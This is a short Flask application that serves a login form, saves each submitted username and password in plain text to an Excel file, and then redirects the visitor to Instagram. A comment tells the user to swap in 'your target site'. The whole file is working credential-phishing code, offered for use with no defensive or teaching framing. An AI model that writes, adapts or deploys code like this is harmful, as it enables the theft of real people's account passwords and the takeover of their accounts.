from flask import Flask, request, render_template, redirect
import pandas as pd
import os

app = Flask(__name__)

@app.route('/')
def form():
    return render_template('form.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Save to Excel
    file_exists = os.path.exists("login_data.xlsx")
    df = pd.DataFrame([[username, password]], columns=["Username", "Password"])
    if file_exists:
        existing = pd.read_excel("login_data.xlsx")
        updated = pd.concat([existing, df], ignore_index=True)
        updated.to_excel("login_data.xlsx", index=False)
    else:
        df.to_excel("login_data.xlsx", index=False)

    # Redirect after login
    return redirect("https://www.instagram.com")  # change this to your target site

if __name__ == "__main__":
    app.run(debug=True)